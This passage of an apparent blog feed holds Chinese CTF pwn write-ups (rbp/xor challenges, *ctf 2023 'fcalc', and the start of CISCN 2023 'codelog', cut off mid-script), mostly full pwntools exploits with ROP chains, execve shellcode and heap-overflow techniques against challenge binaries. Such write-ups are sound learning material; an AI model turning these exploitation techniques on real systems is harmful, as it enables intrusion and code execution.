class="number">0x840</span>-<span class="number">0x30</span>-<span class="number">0x28</span>)+cyclic(<span class="number">0x10</span>)+p64(elf.bss(<span class="number">0x200</span>))+cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;\x00\x01\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,f&#x27;b *&#123;libc_addr+0x10ca1e&#125;&#x27;)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h2><p>劫持rbp可以任意写 然后就是打orw 没什么好说的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node3.anna.nssctf.cn&quot;,28092)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;try it&quot;</span>)</span><br><span class="line">ptr_read = <span class="number">0x401292</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0x800</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x210</span>)+p64(bss_addr+<span class="number">0x210</span>)+p64(ptr_read)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">rbp_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;pop rbp;ret&quot;</span>)))</span><br><span class="line">leave_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;leave;ret&quot;</span>)))</span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(rbp_addr)+p64(bss_addr+<span class="number">0x510</span>)+p64(ptr_read)+<span class="string">b&#x27;./flag\x00\x00&#x27;</span>+cyclic(<span class="number">0x210</span>-<span class="number">0x38</span>)+p64(bss_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4012C0&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>)))</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x0000000000142c92</span></span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag_addr = bss_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x600</span>)+p64(rdx_addr)+p64(<span class="number">0x100</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">1</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x600</span>)+p64(write_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x210</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss_addr+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4012C0&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307312214981.png" title="image-20230731221415889" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307312214981.png" alt="image-20230731221415889"></a></p><p>保护全关了 可用的攻击手法变得多元化起来了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+7h] [rbp-9h] BYREF</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( flag &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot; %hhx&quot;</span>, &amp;v4);</span><br><span class="line">    xorByteWithAddress(v5, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的主体逻辑很简单 </p><p>就是可以向一个任意地址 进行一次单字节的异或的操作</p><p>但是由于while循环的条件是flag小于等于0</p><p>执行完xorByteWithAddress函数后 flag的值自增 就退出while循环</p><p>所以我们首要的思路就是想办法把flag的值修改成负数</p><p>随后往bss段上写入shellcode 利用main函数结束会调用隐式exit函数 中间利用call函数调用了fini_array</p><p>通过覆盖fini_array就可以调用到shellcode</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node3.anna.nssctf.cn&quot;,28092)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">fini_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">addr,xor_message</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;addr: &quot;</span>)</span><br><span class="line">    got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    io.sendline(addr)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;value: &quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io,&#x27;b *0x400738&#x27;)</span></span><br><span class="line">    io.sendline(xor_message)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr =elf.bss(<span class="number">0x300</span>)</span><br><span class="line">shellcode = [<span class="string">&#x27;48&#x27;</span>,<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;f6&#x27;</span>,<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;48&#x27;</span>,<span class="string">&#x27;bf&#x27;</span>,<span class="string">&#x27;2f&#x27;</span>,<span class="string">&#x27;62&#x27;</span>,<span class="string">&#x27;69&#x27;</span>,<span class="string">&#x27;6e&#x27;</span>,<span class="string">&#x27;2f&#x27;</span>,<span class="string">&#x27;2f&#x27;</span>,<span class="string">&#x27;73&#x27;</span>,<span class="string">&#x27;68&#x27;</span>,<span class="string">&#x27;57&#x27;</span>,<span class="string">&#x27;54&#x27;</span>,<span class="string">&#x27;5f&#x27;</span>,<span class="string">&#x27;6a&#x27;</span>,<span class="string">&#x27;3b&#x27;</span>,<span class="string">&#x27;58&#x27;</span>,<span class="string">&#x27;99&#x27;</span>,<span class="string">&#x27;0f&#x27;</span>,<span class="string">&#x27;05&#x27;</span>]</span><br><span class="line">xor(<span class="string">&quot;600BCf&quot;</span>,<span class="string">&quot;ff&quot;</span>)</span><br><span class="line">addr = <span class="string">&quot;600ea0&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shellcode:</span><br><span class="line">    xor(addr,i)</span><br><span class="line">    num = <span class="built_in">int</span>(addr, <span class="number">16</span>)</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    addr = <span class="built_in">format</span>(num, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(addr)</span><br><span class="line">xor(<span class="string">&quot;600970&quot;</span>,<span class="string">&quot;b0&quot;</span>)</span><br><span class="line">xor(<span class="string">&quot;600971&quot;</span>,<span class="string">&quot;8&quot;</span>)</span><br><span class="line">xor(<span class="string">&quot;600972&quot;</span>,<span class="string">&quot;20&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *_dl_fini+524&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">xor(<span class="string">&quot;600Bcf&quot;</span>,<span class="string">&quot;ff&quot;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>星ctf2023</title>
    <link href="http://example.com/2023/07/30/%E6%98%9Fctf2023/"/>
    <id>http://example.com/2023/07/30/%E6%98%9Fctf2023/</id>
    <published>2023-07-29T17:29:23.000Z</published>
    <updated>2023-09-14T17:21:07.486Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>比赛名应该是*ctf 但是由于我hexo框架不能命名为 * 所以只能叫星了</p><h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307300137270.png" title="image-20230730013704199" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307300137270.png" alt="image-20230730013704199"></a></p><p>没有开启NX保护 第一反应就是要打shellcode</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">double</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">double</span> *v9; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">  <span class="type">double</span> v12; <span class="comment">// [rsp+38h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">400LL</span>);</span><br><span class="line">  s = (<span class="number">16</span> * ((&amp;v6 + <span class="number">3</span>) &gt;&gt; <span class="number">4</span>));</span><br><span class="line">  v4 = alloca(<span class="number">64LL</span>);</span><br><span class="line">  buf = s;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x180</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  qword_40E0 = s;</span><br><span class="line">  dword_4010 = <span class="number">0</span>;</span><br><span class="line">  sub_1384();</span><br><span class="line">  say();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = read(<span class="number">0</span>, buf, <span class="number">0x180</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt; <span class="number">47</span> )</span><br><span class="line">      v6 = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; *(buf + i) != <span class="string">&#x27;\n&#x27;</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(buf + i) &lt;= <span class="number">0x20</span> || *(buf + i) &gt; <span class="number">0x30</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(buf + i) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i) &lt;= <span class="number">0x39</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( dword_4010 &gt; <span class="number">47</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++dword_4010;</span><br><span class="line">          v5 = qword_40E0;</span><br><span class="line">          *v5 = atof(buf + i);</span><br><span class="line">          qword_40E0 += <span class="number">8LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *(buf + i + <span class="number">1</span>) == <span class="number">0x2E</span> || *(buf + i + <span class="number">1</span>) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i + <span class="number">1</span>) &lt;= <span class="number">0x39</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// (0x20,0x30]</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dword_4010 &lt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v9 = s;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = <span class="built_in">fabs</span>(*v9);</span><br><span class="line">          <span class="keyword">if</span> ( v12 != <span class="number">0.0</span> &amp;&amp; (v12 &lt; <span class="number">1.0</span> || v12 &gt; <span class="number">100.0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v12);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v9;</span><br><span class="line">        &#125;</span><br><span class="line">        (qword_4060[*(buf + i) - <span class="number">0x20</span>])();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( s &lt; qword_40E0 )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Result: %lf\n&quot;</span>, *(qword_40E0 - <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先需要逆向出来和菜单交互的格式 我们需要使得dword_4010大于1 同时还要绕过这两个循环</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( *(buf + i + <span class="number">1</span>) == <span class="number">0x2E</span> || *(buf + i + <span class="number">1</span>) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i + <span class="number">1</span>) &lt;= <span class="number">0x39</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = <span class="built_in">fabs</span>(*v9);</span><br><span class="line">          <span class="keyword">if</span> ( v12 != <span class="number">0.0</span> &amp;&amp; (v12 &lt; <span class="number">1.0</span> || v12 &gt; <span class="number">100.0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v12);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v9;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>第一个循环 相对来说容易 只需要在对应字符后面加上超出范围的字符即可</p><p>第二个循环限制比较大 对0x48个字长的空间都进行了check</p><p>随后呢根据输入的字符 取决调用哪个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 (__fastcall *sub_1384())()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (__fastcall *result)(); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  qword_4060[<span class="number">0</span>] = printf_nop;</span><br><span class="line">  qword_4068 = printf_nop;</span><br><span class="line">  qword_4070 = printf_nop;</span><br><span class="line">  qword_4078 = printf_nop;</span><br><span class="line">  qword_4080 = printf_nop;</span><br><span class="line">  qword_4088 = printf_nop;</span><br><span class="line">  qword_4090 = printf_nop;</span><br><span class="line">  qword_4098 = printf_nop;</span><br><span class="line">  qword_40A0 = printf_nop;</span><br><span class="line">  qword_40A8 = printf_nop;</span><br><span class="line">  qword_40B0 = sub_12BB;</span><br><span class="line">  qword_40B8 = sub_1208 + <span class="number">1</span>;</span><br><span class="line">  qword_40C0 = printf_nop;</span><br><span class="line">  qword_40C8 = sub_1262;</span><br><span class="line">  qword_40D0 = printf_nop;</span><br><span class="line">  result = sub_1314;</span><br><span class="line">  qword_40D8 = sub_1314;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺便在main函数的开头 还隐藏着一个buf地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">qword_40E0 = s;</span><br></pre></td></tr></table></figure><p>我们通过字符’0’就可以实现call buf 这里就存在了shellcode的调用</p><p>由于我们刚才说到的check的存在 我们没办法把shellcode放到payload后面 所以需要通过把shellcode写到不会被check的前面 然后控制rsp寄存器再跳转过去</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;47.92.7.93&quot;,8802)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your expression:&quot;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add rsp,0x10</span></span><br><span class="line"><span class="string">jmp rsp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;\x35\x40\x35\x40\x30\x30\x30\x30&#x27;</span>+<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span>+cyclic(<span class="number">0x21</span>)+p64(<span class="number">0x4014000000000000</span>)*<span class="number">2</span>+asm(shellcode)+<span class="string">b&#x27;\x40\x40&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x187a)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>Ciscn2023决赛</title>
    <link href="http://example.com/2023/07/26/Ciscn2023%E5%86%B3%E8%B5%9B/"/>
    <id>http://example.com/2023/07/26/Ciscn2023%E5%86%B3%E8%B5%9B/</id>
    <published>2023-07-26T04:51:33.000Z</published>
    <updated>2023-09-14T17:18:45.364Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="codelog"><a href="#codelog" class="headerlink" title="codelog"></a>codelog</h2><p>一道看起来是序列化的简单堆题。。。 被赛方开赛前说的有两题序列化protobuf跟flatbuffers坑了</p><p>导致先去看了第三题的正常堆 结果一个数独逆不出来。。。 结果爆零噜</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        init_code(v16, v3, v4, v5, v6, v7, v18, v19, v20, v21);</span><br><span class="line">        v18 = v16[<span class="number">0</span>];</span><br><span class="line">        v19 = v16[<span class="number">1</span>];</span><br><span class="line">        v20 = v16[<span class="number">2</span>];</span><br><span class="line">        v21 = v16[<span class="number">3</span>];</span><br><span class="line">        check_number = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check_number != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        open_flag();</span><br><span class="line">        encode(s1, v3, v8, v9, v10, v11, v18, v19, v20, v21);</span><br><span class="line">        close_flag();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check_number != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        open_flag();</span><br><span class="line">        decode(s1, v3, v12, v13, v14, v15, v18, v19, v20);</span><br><span class="line">        close_flag();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show_code(s1, v3, v4, v5, v6, v7, v18, v19, v20, v21);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show_tree(v19, <span class="number">2</span> * v20 - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>主要的逻辑就是菜单 不过有几个函数起到了一个误导作用</p><p>关键的漏洞有两个 一个是init_code函数中存在了一个scanf引起的堆溢出 还有一个是没有开启PIE保护机制</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307272227538.png" title="image-20230727222709447" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307272227538.png" alt="image-20230727222709447"></a></p><p>实际其他函数都是一个误导作用  我们只需要利用init_code函数的堆溢出 覆盖tcachebin的fd域 使得申请到bss段上 从而向存放chunk指针的数组写入got表的地址 这样就可以借助show函数把libc地址泄露出来了 随后利用同样的手法打free_hook</p><p>唯一要注意的就是init_code本身会对堆构造产生影响 所以需要自己动调注意一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;47.92.7.93&quot;,8802)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title 